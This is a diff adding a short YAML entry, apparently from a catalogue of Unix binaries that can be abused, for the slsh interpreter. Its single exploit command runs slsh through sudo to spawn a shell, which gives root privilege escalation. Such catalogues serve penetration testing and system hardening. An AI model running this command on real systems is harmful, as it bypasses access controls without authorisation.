@@ -1,0 +1,4 @@
+name: slsh
+binary_path: /usr/bin/slsh
+exploit_cmds:
+- sudo /usr/bin/slsh -e 'system("/bin/sh")'
